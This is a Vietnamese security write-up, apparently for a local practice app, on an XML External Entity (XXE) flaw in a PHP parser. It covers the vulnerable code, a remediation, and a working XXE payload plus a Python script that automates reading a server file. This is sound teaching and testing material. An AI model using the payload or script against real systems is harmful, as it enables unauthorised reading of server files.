1. XML External Entity Injection (XXE)

URL: `http://127.0.0.1/OhMyCrab/modules/xxe/xxe.php`

Ứng dụng tồn tại lỗ hổng XML External Entity Injection (XXE) do parser XML xử lý dữ liệu người dùng cung cấp mà không vô hiệu hóa external entity, sử dụng `LIBXML_NOENT` cho phép parser expand XML entity. Đồng thời ứng dụng bật entity loader bằng `libxml_disable_entity_loader(false);` cho phép attacker định nghĩa external entity tùy ý để đọc file nội bộ trên server.

PoC:

- Truy cập chức năng Parse XML.
- Nhập payload XML
```
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<data>
    <message>&xxe;</message>
</data>
```
- Nhấn Parse XML và quan sát kêt quả trả về.

<img width="811" height="725" alt="image" src="https://github.com/user-attachments/assets/d76d0a0f-485b-43a3-83f8-b4cdb0bf815b" />

-> Attacker có thể đọc file nội bộ trên server.

Phân tích source code

```
        $xml = $_POST['xml'];
        libxml_disable_entity_loader(false);
        $data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
```

- Ứng dụng nhận XML trực tiếp từ người dùng `$xml = $_POST['xml'];`
- External entity loader được bật `libxml_disable_entity_loader(false);`
- Flag `LIBXML_NOENT` cho phép XML parser expand entity

Cách khắc phục

```
        $xml = $_POST['xml'];
        libxml_disable_entity_loader(true);
        $data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET);
```

Sau khi fix, ứng dụng vô hiệu hóa external entity loader bằng `libxml_disable_entity_loader(true);`, sử dụng `LIBXML_NONET` để ngăn XML parser thực hiện network access. Không sử dụng `LIBXML_NOENT`, từ đó ngăn parser expand external entity do attacker kiểm soát.

Script khai thác

```
import requests
import re

url = "http://127.0.0.1/OhMyCrab/modules/xxe/xxe.php"
payload = """<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<data>
    <message>&xxe;</message>
</data>
"""
data = {
    "xml": payload
}
response = requests.post(url, data=data)
match = re.search(r"<pre>(.*?)</pre>", response.text, re.S)
if match:
    output = match.group(1).strip()
    print("Kết quả XXE:")
    print(output)
else:
    print("Không tìm thấy output")
```

script sử dụng để tự động khai thác lỗ hổng XXE bằng cách gửi XML payload chứa external entity tới ứng dụng và trích xuất nội dung file nội bộ từ response trả về.
